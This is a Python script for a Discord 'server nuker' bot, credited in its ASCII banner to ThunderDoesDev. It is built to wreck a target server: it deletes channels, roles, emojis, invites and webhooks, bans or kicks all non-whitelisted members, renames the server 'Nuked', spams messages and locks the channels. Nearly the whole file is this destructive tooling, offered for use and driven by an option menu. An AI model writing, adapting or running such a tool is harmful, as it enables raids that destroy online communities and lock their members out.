import discord
import logging
import os
from datetime import datetime
import asyncio
from tqdm import tqdm  # Add tqdm for progress bar

BANNER = """                                                                                                                
 @@@@@@   @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@      @@@  @@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@   
@@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@     @@@@ @@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@@  
!@@       @@!       @@!  @@@  @@!  @@@  @@!       @@!  @@@     @@!@!@@@  @@!  @@@  @@!  !@@  @@!       @@!  @@@  
!@!       !@!       !@!  @!@  !@!  @!@  !@!       !@!  @!@     !@!!@!@!  !@!  @!@  !@!  @!!  !@!       !@!  @!@  
!!@@!!    @!!!:!    @!@!!@!   @!@  !@!  @!!!:!    @!@!!@!      @!@ !!@!  @!@  !@!  @!@@!@!   @!!!:!    @!@!!@!   
 !!@!!!   !!!!!:    !!@!@!    !@!  !!!  !!!!!:    !!@!@!       !@!  !!!  !@!  !!!  !!@!!!    !!!!!:    !!@!@!    
     !:!  !!:       !!: :!!   :!:  !!:  !!:       !!: :!!      !!:  !!!  !!:  !!!  !!: :!!   !!:       !!: :!!   
    !:!   :!:       :!:  !:!   ::!!:!   :!:       :!:  !:!     :!:  !:!  :!:  !:!  :!:  !:!  :!:       :!:  !:!  
:::: ::    :: ::::  ::   :::    ::::     :: ::::  ::   :::      ::   ::  ::::: ::   ::  :::   :: ::::  ::   :::  
:: : :    : :: ::    :   : :     :      : :: ::    :   : :     ::    :    : :  :    :   :::  : :: ::    :   : :  
                                        by ThunderDoesDev
"""
print(BANNER)

logging.basicConfig(
    filename=f"nuke.log",
    filemode='w',
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.guild_messages = True

client = discord.Client(intents=intents)

TOKEN_FILE = 'token.txt'

WHITELIST = [
    852521383006961687
]

async def get_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as file:
            token = file.read().strip()
            print("Using saved token from token.txt.")
            return token
    else:
        token = input("Please enter your bot token: ").strip()
        with open(TOKEN_FILE, 'w') as file:
            file.write(token)
        print("Token saved to token.txt.")
        return token

async def delete_channels(guild):
    channels = guild.channels
    with tqdm(total=len(channels), desc="Deleting channels", unit="channel") as pbar:
        for channel in channels:
            try:
                await channel.delete()
                logging.info(f"Deleted channel: {channel.name}")
            except Exception as e:
                logging.error(f"Failed to delete channel {channel.name}: {e}")
            pbar.update(1)

async def delete_roles(guild):
    bot_role = discord.utils.get(guild.roles, name=client.user.name)
    roles = [role for role in guild.roles if role != bot_role and role.name != '@everyone']
    with tqdm(total=len(roles), desc="Deleting roles", unit="role") as pbar:
        for role in roles:
            try:
                await role.delete()
                logging.info(f"Deleted role: {role.name}")
            except Exception as e:
                logging.error(f"Failed to delete role {role.name}: {e}")
            pbar.update(1)

async def ban_members(guild):
    members = [member for member in guild.members if not member.bot and member.id not in WHITELIST]
    with tqdm(total=len(members), desc="Banning members", unit="member") as pbar:
        for member in members:
            try:
                await member.ban(reason="Server Nuked")
                logging.info(f"Banned member: {member.name}")
            except Exception as e:
                logging.error(f"Failed to ban member {member.name}: {e}")
            pbar.update(1)

async def kick_members(guild):
    members = [member for member in guild.members if not member.bot and member.id not in WHITELIST]
    with tqdm(total=len(members), desc="Kicking members", unit="member") as pbar:
        for member in members:
            try:
                await member.kick(reason="Server Nuked")
                logging.info(f"Kicked member: {member.name}")
            except Exception as e:
                logging.error(f"Failed to kick member {member.name}: {e}")
            pbar.update(1)

async def delete_emojis(guild):
    emojis = guild.emojis
    with tqdm(total=len(emojis), desc="Deleting emojis", unit="emoji") as pbar:
        for emoji in emojis:
            try:
                await emoji.delete()
                logging.info(f"Deleted emoji: {emoji.name}")
            except Exception as e:
                logging.error(f"Failed to delete emoji {emoji.name}: {e}")
            pbar.update(1)

async def delete_server(guild):
    try:
        await guild.edit(name="Nuked", icon=None)
        logging.info("Server name and icon reset.")
    except Exception as e:
        logging.error(f"Failed to reset server name and icon: {e}")

async def delete_invites(guild):
    invites = await guild.invites()
    with tqdm(total=len(invites), desc="Deleting invites", unit="invite") as pbar:
        for invite in invites:
            try:
                await invite.delete()
                logging.info(f"Deleted invite: {invite.code}")
            except Exception as e:
                logging.error(f"Failed to delete invite {invite.code}: {e}")
            pbar.update(1)

async def delete_webhooks(guild):
    webhooks = []
    for channel in guild.channels:
        webhooks += await channel.webhooks()
    with tqdm(total=len(webhooks), desc="Deleting webhooks", unit="webhook") as pbar:
        for webhook in webhooks:
            try:
                await webhook.delete()
                logging.info(f"Deleted webhook: {webhook.name}")
            except Exception as e:
                logging.error(f"Failed to delete webhook {webhook.name}: {e}")
            pbar.update(1)

async def spam_message(guild):
    try:
        spam_channel = await guild.create_text_channel('nuked-by-bot')
        logging.info(f"Created spam channel: {spam_channel.name}")
        
        spam_message = "This server has been nuked!"
        for _ in range(10):
            await spam_channel.send(spam_message)
        logging.info("Spam message sent 10 times.")
    except Exception as e:
        logging.error(f"Failed to spam messages: {e}")

async def lockdown_channels(guild):
    channels = guild.channels
    with tqdm(total=len(channels), desc="Locking down channels", unit="channel") as pbar:
        for channel in channels:
            try:
                overwrite = discord.PermissionOverwrite(send_messages=False, add_reactions=False)
                await channel.set_permissions(guild.default_role, overwrite=overwrite)
                logging.info(f"Locked down channel: {channel.name}")
            except Exception as e:
                logging.error(f"Failed to lock down channel {channel.name}: {e}")
            pbar.update(1)

async def nuke(guild, option):
    logging.info(f"Nuke operation started with option: {option}")
    
    if option == '1':
        await delete_roles(guild)  # Ensure roles are deleted first
        await delete_channels(guild)
        await ban_members(guild)
        await delete_emojis(guild)
        await delete_server(guild)
        await delete_invites(guild)
        await delete_webhooks(guild)
        await spam_message(guild)
        await lockdown_channels(guild)
    elif option == '2':
        await delete_channels(guild)
    elif option == '3':
        await delete_roles(guild)
    elif option == '4':
        await ban_members(guild)
    elif option == '5':
        await kick_members(guild)
    elif option == '6':
        await delete_emojis(guild)
    elif option == '7':
        await delete_server(guild)
    elif option == '8':
        await delete_invites(guild)
    elif option == '9':
        await delete_webhooks(guild)
    elif option == '10':
        await spam_message(guild)
    elif option == '11':
        await lockdown_channels(guild)
    else:
        print("Invalid option! Use one of the following: `1`, `2`, `3`, `4`, `5`, `6`, `7`, `8`, `9`, `10`, `11`.")
        logging.warning(f"Invalid option: {option}")
    
    logging.info(f"Operation '{option}' completed.")

@client.event
async def on_ready():
    logging.info(f'Logged in as {client.user.name}')
    
    guild = client.get_guild(int(TARGET_SERVER_ID))
    
    if guild:
        print(f"Connected to the server: {guild.name}")
        logging.info(f"Connected to the server: {guild.name}")

        print("\nOptions:\n1. Nuke all (without kicking members)\n2. Delete channels\n3. Delete roles\n4. Ban members\n5. Kick members\n6. Delete emojis\n7. Delete server\n8. Delete invites\n9. Delete webhooks\n10. Spam message\n11. Lockdown channels")
        option = input("Enter nuke option number (1-11): ").strip()
        await nuke(guild, option)
    else:
        print("Server not found.")
        logging.error("Server not found.")

if __name__ == "__main__":
    TOKEN = asyncio.run(get_token())
    TARGET_SERVER_ID = input("Please enter the target server ID: ")

    client.run(TOKEN)
